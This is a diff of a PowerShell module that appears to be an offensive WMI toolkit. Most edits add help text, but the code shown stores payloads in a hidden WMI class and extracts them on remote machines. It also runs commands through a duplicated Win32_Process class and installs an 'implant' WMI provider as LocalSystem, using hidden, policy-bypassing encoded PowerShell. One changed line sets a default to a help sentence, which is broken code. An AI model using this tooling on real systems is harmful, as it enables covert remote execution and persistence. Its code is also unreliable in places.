@@ -11,41 +11,39 @@ Function local:New-WMIConnection {
 	.SYNOPSIS
 
 	.PARAMETER ComputerName
-    
+        Address of the system to connect to. Defaults to localhost.
     .PARAMETER NameSpace
-     
+        WMI Name Space to connect to. Defaults to ROOT\cimv2.
     .PARAMETER TargetClassName
-
-    .PARAMETER DuplicateClassName
-
+        WMI class to connect to.
     .PARAMETER Username
-
+        Username used to authenticate to remote WMI service.
     .PARAMETER Password
-
+        Password stored as a SecureString object to authenticate to remote WMI service.
     .PARAMETER SecurePassword
-
+        Password stored as a SecureString object to authenticate to remote WMI service.
     .PARAMETER Credential
-	
+	    Credential object used authenticate to remote WMI service.
 	.EXAMPLE
         $ManagementClass = New-WMIConnection -TargetClassName Win32_Process -ComputerName $ComputerName -Credential $Credential
 #>
     [CmdletBinding()]
     Param(
-        [Parameter(Mandatory=$False, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
             [String]$ComputerName = ".",
-        [Parameter(Mandatory=$False, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="WMI Name Space to connect to. Defaults to ROOT\cimv2.")]
             [string]$NameSpace = "ROOT\cimv2",
 
-        [Parameter(Mandatory=$False, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="Username used to authenticate to remote WMI service.")]
             [string]$Username,
-        [Parameter(Mandatory=$False, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="Password used to authenticate to remote WMI service.")]
             [string]$Password,
-        [Parameter(Mandatory=$False, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="Password stored as a SecureString object to authenticate to remote WMI service.")]
             [SecureString]$SecurePassword,
-        [Parameter(Mandatory=$False, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="Credential object used authenticate to remote WMI service.")]
             [PSCredential]$Credential,
 
-        [Parameter(Mandatory=$False, HelpMessage="File to upload.")]
+        [Parameter(Mandatory=$False, HelpMessage="WMI class to connect to.")]
             [string]$TargetClassName = [String]::Empty
     )
     $ConnectionOptions = New-Object System.Management.ConnectionOptions;
@@ -85,21 +83,21 @@ Function Invoke-WMIDuplicateClass {
 	.SYNOPSIS
 
 	.PARAMETER ComputerName
-    
+        Address of the system to connect to. Defaults to localhost.
     .PARAMETER NameSpace
-     
+        Namespace to connect to.
     .PARAMETER TargetClassName
-
+        Source class to duplicate.
     .PARAMETER DuplicateClassName
-
+        Destincaiton class to create.
     .PARAMETER Username
-
+        Username used to authenticate to remote WMI service.
     .PARAMETER Password
-
+        Password used to authenticated to remote WMI service
     .PARAMETER SecurePassword
-
+        Password stored as a SecureString object to authenticate to remote WMI service.
     .PARAMETER Credential
-	
+	    Credential object used authenticate to remote WMI service.
 	.EXAMPLE
         Invoke-WMIDuplicateClass -TargetClassName Win32_Process -DuplicateClassName Win32_Duplicate -Computer 192.168.255.240 -Credential $Credential
 	    Invoke-WmiMethod -Class Win32_Duplicate -Name Create -ArgumentList "whoami" -ComputerName $ComputerName -Credential $Credential
@@ -107,23 +105,23 @@ Function Invoke-WMIDuplicateClass {
 
     [CmdletBinding()]
     Param(
-        [Parameter(Mandatory=$False, HelpMessage="System to run against.")]
+        [Parameter(Mandatory=$False, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
             [string]$ComputerName = ".",
         [Parameter(Mandatory=$False, HelpMessage="Namespace to connect to.")]
             [string]$NameSpace = "ROOT\cimv2",
 
-        [Parameter(Mandatory=$False, HelpMessage="Class to duplicate.")]
+        [Parameter(Mandatory=$False, HelpMessage="Source class to duplicate.")]
             [string]$TargetClassName = [String]::Empty,
-        [Parameter(Mandatory=$True, HelpMessage="New class to create.")]
+        [Parameter(Mandatory=$True, HelpMessage="Destincaiton class to create.")]
             [string]$DuplicateClassName,
 
-        [Parameter(Mandatory=$False, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="Username used to authenticate to remote WMI service.")]
             [string]$Username,
-        [Parameter(Mandatory=$False, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="Password used to authenticate to remote WMI service.")]
             [string]$Password,
-        [Parameter(Mandatory=$False, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="Password stored as a SecureString object to authenticate to remote WMI service.")]
             [SecureString]$SecurePassword,
-        [Parameter(Mandatory=$False, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="Credential object used authenticate to remote WMI service.")]
             [PSCredential]$Credential
     )
     Begin {
@@ -152,7 +150,7 @@ Function Invoke-WMIUpload {
     WMI class, extracts the remote strings and reassmbles the file, and writes 
     it to a specified location.
 	.PARAMETER ComputerName
-        The address of the system to connect to.
+        Address of the system to connect to. Defaults to localhost.
     .PARAMETER PayloadPath
      
     .PARAMETER PayloadName
@@ -164,16 +162,16 @@ Function Invoke-WMIUpload {
     .PARAMETER Destination
 
     .PARAMETER Credential
-	
+	    Credential object used authenticate to remote WMI service.
 	.EXAMPLE
 	
 #>
 
     [CmdletBinding()]
     Param(
-        [Parameter(Mandatory=$False, HelpMessage="System to run against.")]
+        [Parameter(Mandatory=$False, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
             [string]$ComputerName = ".",
-        [Parameter(Mandatory=$False, HelpMessage="Credential object to pass.")]
+        [Parameter(Mandatory=$False, HelpMessage="Credential object used authenticate to remote WMI service.")]
             [PSCredential]$Credential,
 
         [Parameter(Mandatory=$True, HelpMessage="File to upload.")]
@@ -184,7 +182,7 @@ Function Invoke-WMIUpload {
             [string]$ClassName = "WMIFS",
         [Parameter(Mandatory=$False, HelpMessage="Location on remote file system to place extracted file.")]
             [string]$Destination = "$env:windir\system32\wbem\",
-        [Parameter(Mandatory=$False, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="Prepare file for memory injection, don't write file to disk.")]
             [switch]$Inject
     )
     Begin {
@@ -205,28 +203,30 @@ Function Invoke-WMIUpload {
 Function Invoke-WMIRemoteExtract {
 <#
 	.SYNOPSIS
-	
+	    Remotely extracts a file stored in WMI and writes it out to disk.
 	.PARAMETER ComputerName
-        The address of the system to connect to.
+        Address of the system to connect to. Defaults to localhost.
+    .PARAMETER Credential
+        Credential object used authenticate to remote WMI service.
     .PARAMETER PayloadName
         The name of the file in WMIFS.
     .PARAMETER ClassName
         The name of the class that the file is stored in.
     .PARAMETER Destination
 	    The location where to file is to be written out to.
-    .PARAMETER Credential
-        The credential object that will be used to authenticate with
     .PARAMETER NoWait
         Do not wait for the WMI extraction to finish before returning.
+    .PARAMETER ShowCommand
+        Display command to be executed. Use with -Verbose.
 	.EXAMPLE
         Invoke-WMIRemoteExtract -PayloadName $PayloadName -ClassName $ClassName -Destination $Destination -ComputerName $ComputerName -Credential $Credential -ShowCommand -Verbose
 #>
 
     [CmdletBinding()]
     Param(
-        [Parameter(Mandatory=$False, HelpMessage="System to run against.")]
+        [Parameter(Mandatory=$False, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
             [string]$ComputerName = ".",
-        [Parameter(Mandatory=$False, HelpMessage="Credential object to pass.")]
+        [Parameter(Mandatory=$False, HelpMessage="Credential object used authenticate to remote WMI service.")]
             [PSCredential]$Credential,
 
         [Parameter(Mandatory=$True, HelpMessage="Name of payload to extract.")]
@@ -235,9 +235,9 @@ Function Invoke-WMIRemoteExtract {
             [string]$ClassName = "WMIFS",
         [Parameter(Mandatory=$True, HelpMessage="Location on remote file system to place extracted file.")]
             [string]$Destination = "$env:windir\system32\wbem\",
-        [Parameter(Mandatory=$False, HelpMessage="Do not wait for extract to finish.")]
+        [Parameter(Mandatory=$False, HelpMessage="Do not wait for extract to finish before returning.")]
             [switch]$NoWait,
-        [Parameter(Mandatory=$False, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="Display command to be executed. Use with -Verbose.")]
             [switch]$ShowCommand
     )
     Begin {
@@ -269,30 +269,32 @@ Function Invoke-WMIRemoteExtract {
 Function Install-WMIProviderInstallUtil {
 <#
 	.SYNOPSIS
-	
+	    Installs a WMI Provider using InstallUtil.exe
 	.PARAMETER ComputerName
-        The address of the system to connect to.
-    .PARAMETER Payload
-
-    .PARAMETER LibraryLocation
-	
+        Address of the system to connect to. Defaults to localhost.
+    .PARAMETER Credential
+        Credential object used authenticate to remote WMI service.
+    .PARAMETER RemoteLibraryLocation
+	    Location where the provider dll is installed.
+    .PARAMETER ShowCommand
+        Display command to be executed. Use with -Verbose.
 	.EXAMPLE
 #>
 
     [CmdletBinding()]
     Param(
-        [Parameter(Mandatory=$True, HelpMessage="System to run against.")]
+        [Parameter(Mandatory=$True, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
             [string]$ComputerName = ".",
-        [Parameter(Mandatory=$False, HelpMessage="Credential object to pass.")]
+        [Parameter(Mandatory=$False, HelpMessage="Credential object used authenticate to remote WMI service.")]
             [PSCredential]$Credential,
 
         [Parameter(Mandatory=$True, HelpMessage="System to run against.")]
-            [string]$LibraryLocation,
-        [Parameter(Mandatory=$False, HelpMessage=".")]
+            [string]$RemoteLibraryLocation,
+        [Parameter(Mandatory=$False, HelpMessage="Display command to be executed. Use with -Verbose.")]
             [switch]$ShowCommand
     )
     Begin {
-        $RemoteCommand = "&([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()+`"\InstallUtil.exe`") /LogToConsole=false /LogFile $LibraryLocation"
+        $RemoteCommand = "&([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()+`"\InstallUtil.exe`") /LogToConsole=false /LogFile $RemoteLibraryLocation"
         $Base64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$RemoteCommand;"))
         $RemoteCommand = "powershell.exe -NoP -NonI -Win Hidden -Exe Bypass -Enc $Base64"
         if ($ShowCommand) {
@@ -312,33 +314,33 @@ Function Install-WMIProviderInstallUtil {
 Function Install-WMIProviderPowerShell {
 <#
 	.SYNOPSIS
-	
+	    Installs a WMI Provider using the .Net ManagedInstallerClass.
 	.PARAMETER ComputerName
-        The address of the system to connect to.
-    .PARAMETER Payload
-
-    .PARAMETER ClassName
-
-    .PARAMETER LibraryLocation
-	
+        Address of the system to connect to. Defaults to localhost.
+    .PARAMETER Credential
+        Credential object used authenticate to remote WMI service.
+    .PARAMETER RemoteLibraryLocation
+        Location where the provider dll is installed.
+    .PARAMETER ShowCommand
+        Display command to be executed. Use with -Verbose.
 	.EXAMPLE
 #>
 
     [CmdletBinding()]
     Param(
-        [Parameter(Mandatory=$True, HelpMessage="System to run against.")]
+        [Parameter(Mandatory=$True, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
             [string]$ComputerName = ".",
-        [Parameter(Mandatory=$False, HelpMessage="Credential object to pass.")]
+        [Parameter(Mandatory=$False, HelpMessage="Credential object used authenticate to remote WMI service.")]
             [PSCredential]$Credential,
 
-        [Parameter(Mandatory=$True, HelpMessage="System to run against.")]
-            [string]$LibraryLocation,
-        [Parameter(Mandatory=$False, HelpMessage=".")]
+        [Parameter(Mandatory=$True, HelpMessage="Location where the provider dll is installed.")]
+            [string]$RemoteLibraryLocation,
+        [Parameter(Mandatory=$False, HelpMessage="Display command to be executed. Use with -Verbose.")]
             [switch]$ShowCommand
     )
     Begin {
         #$RemoteCommand = "`"Add-Type -AssemblyName System.Configuration.Install; `"+[System.Configuration.Install.ManagedInstallerClass]::InstallHelper(@('$LibraryLocation'))"
-        $RemoteCommand = "[System.Configuration.Install.ManagedInstallerClass]::InstallHelper(@('$LibraryLocation'))"
+        $RemoteCommand = "[System.Configuration.Install.ManagedInstallerClass]::InstallHelper(@('$RemoteLibraryLocation'))"
         $Base64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$RemoteCommand;"))
         $RemoteCommand = "powershell.exe -NoP -NonI -Win Hidden -Exe Bypass -Enc $Base64"
         if ($ShowCommand) {
@@ -361,78 +363,78 @@ Function Install-WMIProviderExtention {
 	    Installs the WMI Provider as an extention in ROOT/cimv2/WMI_extension.
         This is a considerably simpler install process.
 	.PARAMETER ComputerName
-        The address of the system to connect to.
+        Address of the system to connect to. Defaults to localhost.
     .PARAMETER Username
-        Username to authenticate to a remote system. 
+        Username used to authenticate to remote WMI service.
         Not required for pass-through authentication.
     .PARAMETER Password
-        Password to authenticate to a remote system. 
+        Password used to authenticated to remote WMI service
         Not required for pass-through authentication.
     .PARAMETER SecurePassword
-        Password stored as secure string to authenticate to a remote system. 
+        Password stored as a SecureString object to authenticate to remote WMI service. 
         Not required for pass-through authentication.
     .PARAMETER Credential
-        PSCredential object used to authenticate to a remote system.
+        Credential object used authenticate to remote WMI service.
         Not required for pass-through authentication.
     .PARAMETER ProviderDisplayName
         Name of WMI class to install on remote system.
     .PARAMETER LibraryClassName
-
-    .PARAMETER dotNetVersion
-
+        Library class name to use in the provider information.
     .PARAMETER CLRVersion
-        
+        Provider clr version.
+    .PARAMETER dotNetVersion
+        Remote dotNet runtime version to use.
     .PARAMETER PublicKeyToken
         Public key token of the signed library.
     .PARAMETER HostingModel
-        
+        WMI hosting model - This is service account to use.
     .PARAMETER uri
         Public key token of the signed library.
     .PARAMETER RemoteLibraryLocation
-	    
+	    Location where the provider dll is installed.
     .PARAMETER LocalLibraryLocation
-	    
+	    Local location where the provider dll is located that can be used to parse information.
 	.EXAMPLE
 
 #>
 
     [CmdletBinding()]
     Param(
-        [Parameter(Mandatory=$false, HelpMessage="System to run against.")]
+        [Parameter(Mandatory=$false, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
             [string]$ComputerName = ".",
-        [Parameter(Mandatory=$False, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="WMI Namespace to install .")]
             [string]$NameSpace = "ROOT\cimv2",
 	    
-        [Parameter(Mandatory=$false, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="Username used to authenticate to remote WMI service.")]
             [string]$Username,
-        [Parameter(Mandatory=$false, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="Password used to authenticate to remote WMI service.")]
             [string]$Password,
-        [Parameter(Mandatory=$false, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="Password stored as a SecureString object to authenticate to remote WMI service.")]
             [SecureString]$SecurePassword,
-        [Parameter(Mandatory=$false, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="Credential object used authenticate to remote WMI service.")]
             [PSCredential]$Credential,
 
-        [Parameter(Mandatory=$false, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="WMI class name to install e.g. Win32_Implant.")]
             [string]$ProviderDisplayName = "Win32_Implant",
-        [Parameter(Mandatory=$false, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="Library class name to use in the provider information.")]
             [string]$LibraryClassName,
-        [Parameter(Mandatory=$false, HelpMessage="Provider clr version.")]
+        [Parameter(Mandatory=$False, HelpMessage="Provider clr version.")]
             [ValidateSet ("v2.0.50727", "v4.0.30319")]
             [string]$RuntimeVersion = "v4.0.30319",
-        [Parameter(Mandatory=$false, HelpMessage="Remote dotNet Runtime Version.")]
+        [Parameter(Mandatory=$False, HelpMessage="Remote dotNet runtime version to use.")]
             [ValidateSet("2.0.0.0", "3.5.0.0", "4.0.0.0")] 
             [string]$dotNetVersion = "4.0.0.0",
-        [Parameter(Mandatory=$false, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="Public key token of the signed library.")]
             [string]$PublicKeyToken,
-        [Parameter(Mandatory=$false, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="WMI hosting model - This is service account to use.")]
+            [ValidateSet("NetworkServiceHost:CLR", "LocalServiceHost:CLR", "LocalSystemHost:CLR")]
             [string]$HostingModel = "LocalSystemHost:CLR",
 
-        [Parameter(Mandatory=$false, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage=".")]
             [string]$uri = "file:///",
-        [Parameter(Mandatory=$false, HelpMessage="Location where the provider dll is installed..")]
+        [Parameter(Mandatory=$False, HelpMessage="Location where the provider dll is installed.")]
             [string]$RemoteLibraryLocation = "$env:windir\system32\wbem\$ClassName.dll",
-
-        [Parameter(Mandatory=$false, HelpMessage="Local location to read file parameters from. This can replace -Provider, -ClassName, and -RunTimeVersion.")]
+        [Parameter(Mandatory=$False, HelpMessage="Local location to read file parameters from. This can replace -Provider, -ClassName, and -RunTimeVersion.")]
             [string]$LocalLibraryLocation = "$env:windir\system32\wbem\$ClassName.dll"
     )
     Begin {
@@ -520,16 +522,16 @@ Function Uninstall-WMIProviderExtention {
 
     [CmdletBinding()]
     Param(
-        [Parameter(Mandatory=$False, HelpMessage="System to run against.")]
+        [Parameter(Mandatory=$False, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
             [string]$ComputerName = ".",
-        [Parameter(Mandatory=$false, HelpMessage=".")]
+        [Parameter(Mandatory=$false, HelpMessage="Credential object used authenticate to remote WMI service.")]
             [PSCredential]$Credential,
 
-        [Parameter(Mandatory=$False, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="WMI namespace to install the WMI class in.")]
             [string]$NameSpace = "ROOT\cimv2",
-        [Parameter(Mandatory=$False, HelpMessage=".")]
+        [Parameter(Mandatory=$True, HelpMessage="The name of the WMI provider to remove.")]
             [string]$ProviderName,
-        [Parameter(Mandatory=$False, HelpMessage=".")]
+        [Parameter(Mandatory=$True, HelpMessage="The name of the WMI class to remove.")]
             [string]$ClassName
     )
     Begin {
@@ -564,14 +566,14 @@ Function Uninstall-WMIProviderExtention {
 Function local:Invoke-WmiCreateExtensionKeysAndValues {
     [CmdletBinding()]
     Param(
-        [Parameter(Mandatory=$true, HelpMessage=".")]
+        [Parameter(Mandatory=$true, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
             [string]$ComputerName = ".",
-        [Parameter(Mandatory=$false, HelpMessage=".")]
+        [Parameter(Mandatory=$false, HelpMessage="Credential object used authenticate to remote WMI service.")]
             [PSCredential]$Credential,
 
-        [Parameter(Mandatory=$true, HelpMessage=".")]
+        [Parameter(Mandatory=$true, HelpMessage="The registry hive to access.")]
             [string]$hDefKey,
-        [Parameter(Mandatory=$true, HelpMessage=".")]
+        [Parameter(Mandatory=$true, HelpMessage="The registry key name to create.")]
             [string[]]$sSubKeyName,
         [Parameter(Mandatory=$False, HelpMessage="Reserved for future use.")]
             [ValidateSet("v2.0.50727", "v4.0.30319")] 
@@ -613,14 +615,14 @@ Function local:Invoke-WmiCreateExtensionKeysAndValues {
 Function local:Invoke-CreateKeyChecked {
     [CmdletBinding()]
     Param(
-        [Parameter(Mandatory=$true, HelpMessage=".")]
+        [Parameter(Mandatory=$true, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
             [string]$ComputerName = ".",
-        [Parameter(Mandatory=$false, HelpMessage=".")]
+        [Parameter(Mandatory=$false, HelpMessage="Credential object used authenticate to remote WMI service.")]
             [PSCredential]$Credential,
 
-        [Parameter(Mandatory=$true, HelpMessage=".")]
+        [Parameter(Mandatory=$true, HelpMessage="The registry hive to access.")]
             [string]$hDefKey,
-        [Parameter(Mandatory=$true, HelpMessage=".")]
+        [Parameter(Mandatory=$true, HelpMessage="The registry key name to create.")]
             [string]$sSubKeyName
     )
     $output = Invoke-WmiMethod -ComputerName $ComputerName -Credential $Credential -Class StdRegProv -Name CreateKey -ArgumentList $hDefKey, $sSubKeyName
@@ -634,18 +636,18 @@ Function local:Invoke-CreateKeyChecked {
 Function local:Invoke-SetStringValueChecked {
     [CmdletBinding()]
     Param(
-        [Parameter(Mandatory=$true, HelpMessage=".")]
+        [Parameter(Mandatory=$true, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
             [string]$ComputerName = ".",
-        [Parameter(Mandatory=$false, HelpMessage=".")]
+        [Parameter(Mandatory=$false, HelpMessage="Credential object used authenticate to remote WMI service.")]
             [PSCredential]$Credential,
 
-        [Parameter(Mandatory=$true, HelpMessage=".")]
+        [Parameter(Mandatory=$true, HelpMessage="The registry hive to access.")]
             [string]$hDefKey,
-        [Parameter(Mandatory=$true, HelpMessage=".")]
+        [Parameter(Mandatory=$true, HelpMessage="The registry key name to create.")]
             [string]$sSubKeyName,
-        [Parameter(Mandatory=$false, HelpMessage=".")]
+        [Parameter(Mandatory=$false, HelpMessage="The registry key entry to set.")]
             [string]$sValueName = "",
-        [Parameter(Mandatory=$true, HelpMessage=".")]
+        [Parameter(Mandatory=$true, HelpMessage="The restry entry value to set.")]
             [string]$sValue 
     )
     $output = Invoke-WmiMethod -ComputerName $ComputerName -Credential $Credential -Class StdRegProv -Name SetStringValue -ArgumentList $hDefKey, $sSubKeyName, $sValueName, $sValue
@@ -885,9 +887,9 @@ Function local:New-ManagementBaseObject {
 Function local:Invoke-ExtensionProviderSetup {
     [CmdletBinding()]
     Param(
-    	[Parameter(Mandatory=$True, HelpMessage=".")] 
+    	[Parameter(Mandatory=$True, HelpMessage="Address of the system to connect to. Defaults to localhost.")] 
             [String]$ComputerName,
-	    [Parameter(Mandatory=$False, HelpMessage=".")]
+	    [Parameter(Mandatory=$False, HelpMessage="Credential object used authenticate to remote WMI service.")]
             [PSCredential]$Credential,
 
         [Parameter(Mandatory=$True, HelpMessage=".")] 
@@ -969,7 +971,7 @@ Function New-WMIFSClass {
 	.SYNOPSIS
     	Creates a new WMI class to be used to store files
     .PARAMETER ComputerName
-        The address of the system to connect to.
+        Address of the system to connect to. Defaults to localhost.
 	.PARAMETER ClassName
 	    Name of class to create.
 	.EXAMPLE
@@ -977,21 +979,21 @@ Function New-WMIFSClass {
 #>
     [CmdletBinding()]
     Param(
-        [Parameter(Mandatory=$False, HelpMessage="System to run against.")]
+        [Parameter(Mandatory=$False, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
             [string]$ComputerName=".",
         
-        [Parameter(Mandatory=$False, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="Username used to authenticate to remote WMI service..")]
             [string]$Username,
-        [Parameter(Mandatory=$False, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="Password used to authenticate to remote WMI service.")]
             [string]$Password,
-        [Parameter(Mandatory=$False, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="Password stored as a SecureString object to authenticate to remote WMI service.")]
             [SecureString]$SecurePassword,
-        [Parameter(Mandatory=$False, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="Credential object used authenticate to remote WMI service.")]
             [PSCredential]$Credential,
 
         [Parameter(Mandatory=$False, HelpMessage="Name of Class to Create.")]
             [string]$ClassName = 'WMIFS',
-        [Parameter(Mandatory=$False, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="The namespace in which to create the WMI class.")]
             [string]$NameSpace = 'ROOT\cimv2'
     )
     Begin {
@@ -1022,17 +1024,19 @@ Function New-WMIFSClass {
 Function ConvertTo-Base64 {
 <#
 	.SYNOPSIS
-	Converts a file to a Base64 encoded string by reading it in as raw bytes
+	    Converts a file to a Base64 encoded string by reading it in as raw bytes
 	.PARAMETER FileName
-	Path to the File to convert
+	    Path to the File to convert
+    .PARAMETER Inject
+        Prepare file for memory injection, dont treat file as unicode.
 	.EXAMPLE
-	$EncodedText = ConvertTo-Base64 -FileName "cmd.exe" -Verbose
+	    $EncodedText = ConvertTo-Base64 -FileName "cmd.exe" -Verbose
 #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$true, HelpMessage="Path to File.")]
             [string]$FileName,
-        [Parameter(Mandatory=$False, HelpMessage=".")]
+        [Parameter(Mandatory=$False, HelpMessage="Prepare file for memory injection, dont treat file as unicode.")]
             [validateset($True, $False)]
             [bool]$Inject = $False
     )
@@ -1056,7 +1060,7 @@ Function ConvertTo-Base64 {
 
 ################################################################################
 ################################################################################
-Function Add-Entry {
+Function local:Add-Entry {
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$true, HelpMessage=".")]
@@ -1079,15 +1083,25 @@ Function Add-Entry {
 Function Invoke-InsertFileThreaded {
 <#
 	.SYNOPSIS
-	Slices a string into defined lengths and inserts it into a WMI class.
+	    Slices a string into defined lengths and inserts it into a WMI class.
 	.PARAMETER EncodedText
-	The Base64 encoded text to insert.
+	    The Base64 encoded text to insert.
 	.PARAMETER FileName
-	Name to identify the file in WMI. This value can be random.
+	    Name to identify the file in WMI. This value can be random.
 	.PARAMETER ClassName
-	Name of the WMI class to insert into.
+	    Name of the WMI class to insert into.
+    .PARAMETER StrLen
+        Allowed String Length.
+    .PARAMETER Encrypt
+        Encrypt the input file. This increase the file size by approximately 4x.
+    .PARAMETER Key
+        Optional Encryption Key.
+    .PARAMETER Credential
+        Credential object used authenticate to remote WMI service.
+    .PARAMETER ComputerName
+        Address of the system to connect to. Defaults to localhost.
 	.EXAMPLE
-	Invoke-InsertFile -EncodedText $EncodedText -FileName "definately_not_cmd.exe" -ClassName WMIFS -StrLen $length -Verbose
+	    Invoke-InsertFile -EncodedText $EncodedText -FileName "definately_not_cmd.exe" -ClassName WMIFS -StrLen $length -Verbose
 #>
     [CmdletBinding()]
     Param(
@@ -1104,13 +1118,13 @@ Function Invoke-InsertFileThreaded {
             [string]$StrLen = 8000,
         [Parameter(Mandatory=$false, HelpMessage="Encrypt the input file. This increase the file size by approximately 4x")]
             [switch]$Encrypt,
-        [Parameter(Mandatory=$false, HelpMessage="Optional Encryption Key")]
+        [Parameter(Mandatory=$false, HelpMessage="Optional Encryption Key.")]
             [ValidateLength(16,16)]
             [string]$Key,
-        [Parameter(Mandatory=$false, HelpMessage="Credential object to pass.")]
+        [Parameter(Mandatory=$false, HelpMessage="Credential object used authenticate to remote WMI service.")]
             [object]$Credential,
         [Parameter(Mandatory=$false, HelpMessage="System to run against.")]
-            [string]$ComputerName = "."
+            [string]$ComputerName = "Address of the system to connect to. Defaults to localhost."
     )
     Begin {
         $index = 0
@@ -1163,27 +1177,35 @@ Function Invoke-InsertFileThreaded {
 Function Invoke-RetrieveFile {
 <#
 	.SYNOPSIS
-	Retrieves a file from WMI identified by the FileName
-	.PARAMETER FileName
-	Name of the file in WMI.
+	    Retrieves a file from WMI identified by the FileName
+	.PARAMETER ComputerName
+        Address of the system to connect to. Defaults to localhost.
+    .PARAMETER Credential
+        Credential object used authenticate to remote WMI service.
+    .PARAMETER FileName
+	    Name of the file in WMI.
 	.PARAMETER ClassName
-	Name of the WMI class to retrieve from.
+	    Name of the WMI class to retrieve from.
+    .PARAMETER Decrypt
+        Decrypt the Retrieved File.
+    .PARAMETER Key
+        Optional Decryption Key.
 	.EXAMPLE
-	$File = Invoke-RetrieveFile -FileName "cmd.exe" -ClassName WMIFS -Verbose
+	    $File = Invoke-RetrieveFile -FileName "cmd.exe" -ClassName WMIFS -Verbose
 #>
     [CmdletBinding()]
     Param(
-        [Parameter(Mandatory=$false, HelpMessage="System to run against.")]
+        [Parameter(Mandatory=$false, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
             [string]$ComputerName = ".",
-        [Parameter(Mandatory=$false, HelpMessage="Credential object to pass.")]
+        [Parameter(Mandatory=$false, HelpMessage="Credential object used authenticate to remote WMI service.")]
             [object]$Credential,
         [Parameter(Mandatory=$true, HelpMessage="Name of File to Retrieve")]
             [string]$FileName,
         [Parameter(Mandatory=$false, HelpMessage="Name of Class to Create.")]
             [string]$ClassName = 'WMIFS',
-        [Parameter(Mandatory=$false, HelpMessage="Decrypt the Retrieved File")]
+        [Parameter(Mandatory=$false, HelpMessage="Decrypt the Retrieved File.")]
             [switch]$Decrypt,
-        [Parameter(Mandatory=$false, HelpMessage="Optional Decryption Key")]
+        [Parameter(Mandatory=$false, HelpMessage="Optional Decryption Key.")]
             [ValidateLength(16,16)]
             [string]$Key
     )
@@ -1216,15 +1238,15 @@ Function Invoke-RetrieveFile {
 Function ConvertFrom-Base64 {
 <#
 	.SYNOPSIS
-	Converts a File from Base64 back to raw bytes
+	    Converts a File from Base64 back to raw bytes
 	.PARAMETER EncodedText
-	The Base64 encoded text to decode.
+	    The Base64 encoded text to decode.
 	.PARAMETER WriteToDisk
-	Switch to write file back to disk
+	    Switch to write file back to disk
 	.PARAMETER FileName
-	Name of file to write out to.
+	    Name of file to write out to.
 	.EXAMPLE
-	ConvertFrom-Base64 -EncodedText $EncodedText -WriteToDisk -FileName 'C:\calc.exe' -Verbose
+	    ConvertFrom-Base64 -EncodedText $EncodedText -WriteToDisk -FileName 'C:\calc.exe' -Verbose
 	
 	$File = ConvertFrom-Base64 -EncodedText $EncodedText -Verbose
 	Set-Content -Path "NothingToSeeHere.txt" -Value $File -Encoding Byte
@@ -1263,11 +1285,11 @@ Function ConvertFrom-Base64 {
 Function ConvertTo-EncryptedText{
 <#
 	.SYNOPSIS
-	
+	    
 	.PARAMETER PlaintextString
-	
+	    String of Text to Encrypt.
 	.PARAMETER Key
-	
+	    Optional Encryption Key.
 	.EXAMPLE
 	
 #>
@@ -1300,9 +1322,9 @@ Function ConvertFrom-EncryptedText{
 	.SYNOPSIS
 	
 	.PARAMETER EncryptedString
-	
+	    String of Text to Decrypt.
 	.PARAMETER Key
-	
+	    Optional Decryption Key.
 	.EXAMPLE
 	
 #>
@@ -1310,7 +1332,7 @@ Function ConvertFrom-EncryptedText{
     Param(
         [Parameter(Mandatory=$true, HelpMessage="String of Text to Decrypt.")]
             [string]$EncryptedString,
-        [Parameter(Mandatory=$false, HelpMessage="Optional Decryption Key")]
+        [Parameter(Mandatory=$false, HelpMessage="Optional Decryption Key.")]
             [string]$Key
     )
     Begin {
